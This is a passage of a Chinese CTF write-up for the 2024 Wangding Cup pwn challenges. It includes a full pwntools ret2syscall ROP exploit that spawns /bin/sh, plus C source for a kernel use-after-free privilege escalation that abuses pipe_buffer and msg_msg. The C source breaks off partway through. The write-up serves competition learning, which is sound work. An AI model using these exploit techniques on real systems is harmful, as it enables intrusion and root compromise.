---
title: 2024第四届“网鼎杯”玄武组 writeup
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247511462&idx=1&sn=fbec02845f714c4abb26286e28205046&chksm=e89d857edfea0c6805b9e1172551d6c7f80a8251aab14bc8ff3298b829000c15d4f619b4ba97&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2024-11-08
fetch_date: 2025-10-06T19:20:25.616074
---

# 2024第四届“网鼎杯”玄武组 writeup

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5fn20xFrjglhDwmqRbu9UD7Qx0ib1ic2Vr3VQhfLnAosgykY9ZAkUzxhQ/0?wx_fmt=jpeg)

# 2024第四届“网鼎杯”玄武组 writeup

原创

Mini-Venom

ChaMd5安全团队

> > 招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱
> >
> > admin@chamd5.org(带上简历和想加入的小组)

## PWN

### pwn02

首先拿到题目，checksec，检查一下保护

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5FvOclRtAOm7dqV6VHkXib766ic0NeOnHxrNACAPOrlWrGcyozibE7QjjA/640?wx_fmt=png&from=appmsg)

image-20241104152553574

之后调试运行，发现给出canary，接受一下

找到主函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5ympE9E0YUVkzD9u9Lb9ibwicjnmnYsVqYPFMvLtthreJib76FZ7Jq8jmQ/640?wx_fmt=png&from=appmsg)

image-20241104153451391

漏洞函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5RvTyXFibwfZuZcduYicUDV6iaiciaeIQrPpPpocVNztlYjPDSIGcuF4MfIg/640?wx_fmt=png&from=appmsg)

image-20241104153621959

\x11\x11\x11....绕过检测，之后进入fork，并且有栈溢出，pwndbg没办法跟fork，这里选择打ret2syscall

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5ibHzHicvOic6RfDFkRFLRlefbfobhKic8Xy4QxYWrqg0nxHFia3tnia81Ggg/640?wx_fmt=png&from=appmsg)

image-20241104174622553

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5cRlCjibnZN1vWBdDfbHkdkaE2iae99sfnWQdYBlteUyYOg0gP9NTh5pA/640?wx_fmt=png&from=appmsg)

image-20241104152820615

首先设置一次read并执行栈迁移返回我们读入的地方，因为我们要读入execve的链子

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5vdiacjc8wnwFP7GbLchXtyc1Vm87ibtyiaebSDiawgKQtibyGiakXrvKz8ZQ/640?wx_fmt=png&from=appmsg)

image-20241104153056315

成功劫持程序流程

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5bicibvCsOoueyTOfrKNZIEFTtkM6cWJK4UcEkVUxDyyNC7FFzFzibib2SQ/640?wx_fmt=png&from=appmsg)

image-20241104153740928

执行完之后获取shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5CxwF9YKkIU5ZKHoaAviavVkFqS2hSiaZ6axzd28lJMnXnKmo8ZXUnXQw/640?wx_fmt=png&from=appmsg)

image-20241104153802315

```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
 return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

#context(os='linux',arch='i386',log_level='debug')
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so')
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')

rax = 0x0000000000450277
rdi = 0x000000000040213f
rsi = 0x000000000040a1ae
rdx = 0x0000000000485feb
rbp = 0x0000000000401771
bss = 0x4C72A0 + 0x100
syscall = 0x000000000041ac26
leave_ret=0x40192F
rl(b"gift: ")
gift = int(p.recv(18),16)
li(hex(gift))
pay = p64(1)*8
s(pay)
rl("Wanna return?\n")
s(b'a')
rl("once again?\n")
pay = b'\x40'*(0x100)
#bug()
s(pay)

rl("once again?\n")
pay = b'\x11'*(0x108) + p64(gift)*2 + p64(rdi) + p64(0) + p64(rsi) + p64(bss) + p64(rdx) + p64(0xfff)*2 + p64(rax)+p64(0)+p64(syscall)+p64(rbp)+p64(bss)+p64(leave_ret)
#bug()
sl(pay)

#pause()
payload=b'/bin/sh\x00'+p64(rdi)+p64(bss)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(rax)+p64(0x3b)+p64(syscall)

s(payload)

inter()
```

### pwn3

拿到题目，进行分析

题目存在明显的uaf，并且kallsyms文件可读，所以只需要泄漏堆地址即可，随后通过uaf修改pipe\_buffer的ops到堆上，最终劫持栈到堆上实现rop

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5e50VdFB2RocqxfbrFYdJGJHFccD7A59O2TIdA7HkKhc53l0ia6Yys0w/640?wx_fmt=png&from=appmsg)

image-20241104172808077

kallsyms文件可读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRG94Wfy2OJWNprepeNNcq5KicVnamAhWhqu2TXRX1lThLpqCj9K1zhR8grdmKic1Yvic3HLGlT9dSug/640?wx_fmt=png&from=appmsg)

image-20241104173136936

代码片段实现了一个利用用户内存释放漏洞（Use-After-Free, UAF）的攻击载荷。主要步骤包括创建消息队列、发送和接收消息以操控内存，最终利用ROP（返回导向编程）技术执行代码

```
#define _GNU_SOURCE
#include <err.h>
#include <inttypes.h>
#include <sched.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <stdio.h>
// #include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <time.h>

#define MSG_COPY 040000
#define MSG_TAG 0xAAAAAAAA
#define PRIMARY_MSG_TYPE 0x41
#define SECONDARY_MSG_TYPE 0x42

#define MSG_QUEUE_NUM 4096

#define PRIMARY_MSG_SIZE 96
#define SECONDARY_MSG_SIZE 0x400
#define VICTIM_MSG_TYPE 0x1337

#define SOCKET_NUM 32
#define SK_BUFF_NUM 128
#define PIPE_NUM 256

size_t user_cs, user_ss, user_sp, user_rflags;
void save_status()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    puts("[*]status has been saved.");
}

struct list_head
{
    struct list_head *next, *prev;
};

struct msg_msgseg
{
    uint64_t next;
};

struct msg_msg
{
    struct list_head m_list;
    long m_type;
    size_t m_ts;    /* message text size */
    void *next;     /* struct msg_msgseg *next; */
    void *security; /* NULL without SELinux */
    /* the actual message follows immediately */
};

struct pipe_buffer
{
    uint64_t page;
    uint32_t offset, len;
    uint64_t ops;
    uint32_t flags;
    uint32_t padding;
    uint64_t private;
};

struct pipe_buf_operations
{
    uint64_t confirm;
    uint64_t release;
    uint64_t try_steal;
    uint64_t get;
};

struct
{
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
} primary_msg;

struct
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
} secondary_msg;

void errExit(char *err_msg)
{
    puts(err_msg);
    exit(-1);
}

void get_shell()
{
    if (getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }
    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

void print_hex(char *buf, int size)
{
    int i;
    puts("======================================");
    printf("data :\n");
    for (i = 0; i < (size / 8); i++)
    {
        if (i % 2 == 0)
        {
            if (i / 2 < 10)
            {
                printf("%d  ", i / 2);
            }
            else if (i / 2 < 100)
            {
                printf("%d ", i / 2);
            }
            else
            {
                printf("%d", i / 2);
            }
        }
        printf(" %16llx", *(size_t *)(buf + i * 8));
        if (i % 2 == 1)
        {
            printf("\n");
        }
    }
    puts("======================================");
}

unsigned long kernel_addr;
unsigned long kernel_base;
unsigned long kernel_offset;
int fd;

void create(int size)
{
    ioctl(fd, 0x0, size);
}

void delete()
{
    ioctl(fd, 1);
}

void obj_read(char *buf, int bufsize)
{
    read(fd, buf, bufsize);
}

void obj_write(char *buf, int bufsize)
{
    write(fd, buf, bufsize);
}

int my_read(int fd, char *buf, int size)
{
    char a;
    for (int i = 0; i < size; i++)
    {
        read(fd, ...